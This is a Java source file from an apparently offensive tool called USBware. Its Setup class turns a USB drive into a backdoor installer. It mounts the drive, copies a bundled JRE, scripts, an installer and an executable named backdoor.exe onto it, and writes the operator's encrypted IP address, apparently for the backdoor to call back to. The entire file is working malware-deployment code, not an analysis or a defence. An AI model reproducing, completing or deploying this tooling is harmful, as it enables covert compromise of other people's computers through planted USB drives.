package thatcherdev.usbware.usbware;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import javax.swing.filechooser.FileSystemView;
import org.apache.commons.io.FileUtils;
import thatcherdev.usbware.backend.Utils;

public class Setup {

	/**
	 * Prompt user to select letter of USB drive to convert.
	 * 
	 * @return letter of USB drive to convert
	 */
	public static String windowsDriveSelect() {
		System.out.println("Insert a USB drive and press ENTER to continue...");
		USBware.sc.nextLine();
		File[] roots=File.listRoots();
		if(roots.length==1)
			USBware.error("No USB drive found");
		System.out.println("Enter letter of USB drive (in parentheses) to convert:");
		for(File file:roots)
			if(!file.getAbsolutePath().equals("C:\\")) {
				String info=FileSystemView.getFileSystemView().getSystemDisplayName(file);
				System.out.println(info.substring(0, info.lastIndexOf("("))+"\t(letter: "+file.getAbsolutePath().substring(0, 1)+")");
			}
		String drive=USBware.getInput("drive");
		return drive;
	}

	/**
	 * Convert USB drive with letter {@link drive} to a backdoor installation tool.
	 * 
	 * @param drive letter of USB drive to convert
	 * @throws IOException
	 */
	public static void windowsInstallSetup(String drive, boolean jre) throws IOException {
		if(jre) {
			String jrePath=System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\files\\jre\\bin"));
			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\files\\jre\\lib"));
		}
		FileUtils.copyDirectory(new File("files\\scripts"), new File(drive+":\\files\\scripts"));
		FileUtils.copyFile(new File("files\\ins.exe"), new File(drive+":\\run.exe"));
		FileUtils.copyFile(new File("files\\run.exe"), new File(drive+":\\files\\backdoor.exe"));
		PrintWriter out=new PrintWriter(new File(drive+":\\files\\ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Convert USB drive with letter {@link drive} to a backdoor.
	 * 
	 * @param drive letter of USB drive to convert
	 * @throws IOException
	 */
	public static void windowsRunSetup(String drive, boolean jre) throws IOException {
		if(jre) {
			String jrePath=System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\jre\\bin"));
			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\jre\\lib"));
		}
		FileUtils.copyDirectory(new File("files\\scripts"), new File(drive+":\\scripts"));
		FileUtils.copyFile(new File("files\\run.exe"), new File(drive+":\\run.exe"));
		PrintWriter out=new PrintWriter(new File(drive+":\\ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Prompt user to select USB drive to convert. Mounts this USB drive.
	 */
	public static void linuxDriveMount() {
		System.out.println("Insert a USB drive, unmount it (if mounted), and press ENTER to continue...");
		USBware.sc.nextLine();
		ArrayList<String> devices=new ArrayList<String>(Arrays.asList(Utils.runBashCommand("ls /dev/disk/by-label/").split("\n")));
		System.out.println("Enter name of USB drive (in parentheses) to convert:");
		for(String device:devices) {
			String nameInfo=Utils.runBashCommand("file /dev/disk/by-label/"+device);
			System.out.println(device+"\t(name: "+nameInfo.substring(nameInfo.lastIndexOf("/")+1)+")");
		}
		String name=USBware.getInput("");
		Utils.runBashCommand("sudo mkdir /media/USBware");
		Utils.runBashCommand("sudo chown -R "+System.getProperty("user.name")+":"+System.getProperty("user.name")+" /media/USBware");
		Utils.runBashCommand("sudo mount /dev/"+name+" /media/USBware -o uid="+System.getProperty("user.name")+",gid="+System.getProperty("user.name"));
	}

	/**
	 * Converts USB drive mounted to /media/EvilUSB/ to a backdoor installation
	 * tool.
	 * 
	 * @throws IOException
	 */
	public static void linuxInstallSetup() throws IOException {
		if(new File("jre").isDirectory()&&(new File("jre/bin/").isDirectory()&&new File("jre/lib/").isDirectory())) {
			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/files/jre/bin/"));
			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/files/jre/lib/"));
		}
		FileUtils.copyDirectory(new File("files/scripts/"), new File("/media/USBware/files/scripts/"));
		FileUtils.copyFile(new File("files/ins.exe"), new File("/media/USBware/run.exe"));
		FileUtils.copyFile(new File("files/run.exe"), new File("/media/USBware/files/backdoor.exe"));
		PrintWriter out=new PrintWriter(new File("/media/USBware/files/ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Converts USB drive mounted to /media/EvilUSB/ to a backdoor.
	 * 
	 * @throws IOException
	 */
	public static void linuxRunSetup() throws IOException {
		if(new File("jre").isDirectory()&&(new File("jre/bin/").isDirectory()&&new File("jre/lib/").isDirectory())) {
			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/jre/bin/"));
			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/jre/lib/"));
		}
		FileUtils.copyDirectory(new File("files/scripts/"), new File("/media/USBware/scripts/"));
		FileUtils.copyFile(new File("files/run.exe"), new File("/media/USBware/run.exe"));
		PrintWriter out=new PrintWriter(new File("/media/USBware/ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Unmounts /media/EvilUSB/ and removes the folder.
	 */
	public static void linuxFinish() {
		Utils.runBashCommand("sudo umount /media/USBware");
		Utils.runBashCommand("sudo rm -r /media/USBware");
	}
}